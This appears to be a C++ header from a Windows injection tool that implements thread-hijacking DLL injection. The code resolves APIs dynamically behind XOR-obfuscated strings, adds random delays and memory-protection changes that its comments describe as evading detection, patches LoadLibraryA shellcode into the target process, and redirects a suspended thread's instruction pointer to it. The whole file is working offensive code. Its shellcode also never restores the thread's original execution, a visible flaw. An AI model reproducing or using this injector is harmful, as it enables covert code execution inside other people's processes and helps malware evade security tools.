#pragma once

// Windows headers first
#include <tlhelp32.h>
#include <windows.h>


// Standard library headers
#include <cstdlib>
#include <cstring>
#include <ctime>
#include <vector>


// Custom headers
#include "Logger.h"
#include "Syscalls.h"
#include "XorStr.h"

// Enhanced Thread Hijacker with Advanced Stealth

class ThreadHijacker {
private:
  // Random delay to evade timing-based detection
  static void RandomDelay() {
    int delay = 10 + (rand() % 50); // 10-60ms
    Sleep(delay);
  }

public:
  static bool Inject(int pid, const char *dllPath) {
    // Seed random for timing obfuscation
    srand((unsigned int)time(NULL));

    // Dynamic API Resolution
    using f_OpenProcess = HANDLE(WINAPI *)(DWORD, BOOL, DWORD);
    using f_CreateToolhelp32Snapshot = HANDLE(WINAPI *)(DWORD, DWORD);
    using f_Thread32First = BOOL(WINAPI *)(HANDLE, LPTHREADENTRY32);
    using f_Thread32Next = BOOL(WINAPI *)(HANDLE, LPTHREADENTRY32);
    using f_OpenThread = HANDLE(WINAPI *)(DWORD, BOOL, DWORD);
    using f_SuspendThread = DWORD(WINAPI *)(HANDLE);
    using f_GetThreadContext = BOOL(WINAPI *)(HANDLE, LPCONTEXT);
    using f_SetThreadContext = BOOL(WINAPI *)(HANDLE, CONST CONTEXT *);
    using f_ResumeThread = DWORD(WINAPI *)(HANDLE);
    using f_VirtualAllocEx =
        LPVOID(WINAPI *)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
    using f_WriteProcessMemory =
        BOOL(WINAPI *)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T *);
    using f_CloseHandle = BOOL(WINAPI *)(HANDLE);

    RandomDelay();

    auto pOpenProcess = (f_OpenProcess)Syscalls::GetAPI(XSTRING("OpenProcess"));
    auto pCreateToolhelp32Snapshot =
        (f_CreateToolhelp32Snapshot)Syscalls::GetAPI(
            XSTRING("CreateToolhelp32Snapshot"));
    auto pThread32First =
        (f_Thread32First)Syscalls::GetAPI(XSTRING("Thread32First"));
    auto pThread32Next =
        (f_Thread32Next)Syscalls::GetAPI(XSTRING("Thread32Next"));
    auto pOpenThread = (f_OpenThread)Syscalls::GetAPI(XSTRING("OpenThread"));
    auto pSuspendThread =
        (f_SuspendThread)Syscalls::GetAPI(XSTRING("SuspendThread"));
    auto pGetThreadContext =
        (f_GetThreadContext)Syscalls::GetAPI(XSTRING("GetThreadContext"));
    auto pSetThreadContext =
        (f_SetThreadContext)Syscalls::GetAPI(XSTRING("SetThreadContext"));
    auto pResumeThread =
        (f_ResumeThread)Syscalls::GetAPI(XSTRING("ResumeThread"));
    auto pVirtualAllocEx =
        (f_VirtualAllocEx)Syscalls::GetAPI(XSTRING("VirtualAllocEx"));
    auto pWriteProcessMemory =
        (f_WriteProcessMemory)Syscalls::GetAPI(XSTRING("WriteProcessMemory"));
    auto pCloseHandle = (f_CloseHandle)Syscalls::GetAPI(XSTRING("CloseHandle"));

    if (!pOpenProcess || !pCreateToolhelp32Snapshot || !pOpenThread ||
        !pSuspendThread) {
      Logger::Log("Failed to resolve ThreadHijack APIs.");
      return false;
    }

    RandomDelay();

    // Use minimal access rights
    HANDLE hProcess =
        pOpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, pid);
    if (!hProcess) {
      Logger::Log("Failed to open process for ThreadHijack.");
      return false;
    }

    Logger::Log("Scanning threads in target process...");
    HANDLE hThread = NULL;
    HANDLE hSnap = pCreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (hSnap != INVALID_HANDLE_VALUE) {
      THREADENTRY32 te;
      te.dwSize = sizeof(THREADENTRY32);
      if (pThread32First(hSnap, &te)) {
        do {
          if (te.th32OwnerProcessID == (DWORD)pid) {
            RandomDelay();
            hThread = pOpenThread(THREAD_SUSPEND_RESUME | THREAD_GET_CONTEXT |
                                      THREAD_SET_CONTEXT,
                                  FALSE, te.th32ThreadID);
            if (hThread) {
              Logger::Log("Found thread ID: %d", te.th32ThreadID);
              break;
            }
          }
        } while (pThread32Next(hSnap, &te));
      }
      pCloseHandle(hSnap);
    }

    if (!hThread) {
      Logger::Log("Failed to find appropriate thread to hijack.");
      pCloseHandle(hProcess);
      return false;
    }

    RandomDelay();

    Logger::Log("Suspending thread...");
    pSuspendThread(hThread);

    CONTEXT ctx;
    memset(&ctx, 0, sizeof(CONTEXT));
    ctx.ContextFlags = CONTEXT_FULL;

    if (!pGetThreadContext(hThread, &ctx)) {
      Logger::Log("Failed to get thread context.");
      pResumeThread(hThread);
      pCloseHandle(hThread);
      pCloseHandle(hProcess);
      return false;
    }

    Logger::Log("Preparing shellcode...");
    // x64 shellcode: sub rsp, 0x28; mov rcx, [DLL_PATH]; mov rax,
    // [LoadLibraryA]; call rax; add rsp, 0x28; ret
    unsigned char shellcode[] = "\x48\x83\xEC\x28"
                                "\x48\xB9\x00\x00\x00\x00\x00\x00\x00\x00"
                                "\x48\xB8\x00\x00\x00\x00\x00\x00\x00\x00"
                                "\xFF\xD0"
                                "\x48\x83\xC4\x28"
                                "\xC3";

    RandomDelay();

    void *pDllPath = pVirtualAllocEx(hProcess, NULL, strlen(dllPath) + 1,
                                     MEM_COMMIT, PAGE_READWRITE);
    if (!pDllPath) {
      Logger::Log("Failed to allocate memory for DLL path.");
      pResumeThread(hThread);
      pCloseHandle(hThread);
      pCloseHandle(hProcess);
      return false;
    }
    pWriteProcessMemory(hProcess, pDllPath, dllPath, strlen(dllPath) + 1, NULL);

    HMODULE hKernel32 = Syscalls::GetModuleHandle_Custom(L"kernel32.dll");
    void *pLoadLibraryA =
        Syscalls::GetProcAddress_Custom(hKernel32, XSTRING("LoadLibraryA"));

    if (!pLoadLibraryA) {
      Logger::Log("Failed to resolve LoadLibraryA.");
      pResumeThread(hThread);
      pCloseHandle(hThread);
      pCloseHandle(hProcess);
      return false;
    }

    // Patch shellcode with addresses
    memcpy(shellcode + 6, &pDllPath, 8);
    memcpy(shellcode + 16, &pLoadLibraryA, 8);

    RandomDelay();

    // Allocate shellcode with PAGE_READWRITE first, then change to
    // PAGE_EXECUTE_READ (less suspicious)
    void *pShellcode = pVirtualAllocEx(hProcess, NULL, sizeof(shellcode),
                                       MEM_COMMIT, PAGE_READWRITE);
    if (!pShellcode) {
      Logger::Log("Failed to allocate memory for shellcode.");
      pResumeThread(hThread);
      pCloseHandle(hThread);
      pCloseHandle(hProcess);
      return false;
    }
    pWriteProcessMemory(hProcess, pShellcode, shellcode, sizeof(shellcode),
                        NULL);

    // Change to executable (more stealthy than PAGE_EXECUTE_READWRITE)
    using f_VirtualProtectEx =
        BOOL(WINAPI *)(HANDLE, LPVOID, SIZE_T, DWORD, PDWORD);
    auto pVirtualProtectEx =
        (f_VirtualProtectEx)Syscalls::GetAPI(XSTRING("VirtualProtectEx"));
    if (pVirtualProtectEx) {
      DWORD oldProtect;
      pVirtualProtectEx(hProcess, pShellcode, sizeof(shellcode),
                        PAGE_EXECUTE_READ, &oldProtect);
    }

    Logger::Log("Hijacking RIP -> %p", pShellcode);
#ifdef _WIN64
    ctx.Rip = (DWORD64)pShellcode;
#else
    ctx.Eip = (DWORD)pShellcode;
#endif

    if (!pSetThreadContext(hThread, &ctx)) {
      Logger::Log("Failed to set thread context.");
      pResumeThread(hThread);
      pCloseHandle(hThread);
      pCloseHandle(hProcess);
      return false;
    }

    RandomDelay();

    Logger::Log("Resuming thread...");
    pResumeThread(hThread);

    pCloseHandle(hThread);
    pCloseHandle(hProcess);
    Logger::Log("Thread Hijack completed.");
    return true;
  }
};
